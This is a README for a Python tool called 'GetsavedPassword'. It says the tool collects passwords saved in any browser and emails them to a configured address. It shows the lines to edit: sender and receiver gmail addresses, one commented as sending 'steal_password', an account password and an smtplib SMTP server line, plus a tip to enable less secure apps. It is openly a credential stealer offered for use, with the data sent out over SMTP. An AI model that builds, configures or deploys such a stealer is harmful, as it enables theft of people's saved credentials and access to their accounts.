# GetsavedPassword
This is A python code to get the passwords saved in any Browser including Edge.
This code collects the password saved in browser and sends back to Any mail Id as you have to give the Id and password in the code.. if you are not a gmail user 
you have to change the smtp port as by the service provider
and dont forget to change https://www.google.com/settings/security/lesssecureapps if you area a gmail user

Change In This Line::::
addr_from = 'sendermailaddress@gmail.com'  # your email to send steal_password


addr_to = 'Reciversmailaddress@gmail.com '  # receive email


password = 'password'  # Your gmail password

please change below line if u are Not a Gmail User:::

server = smtplib.SMTP('smtp.gmail.com', 587)
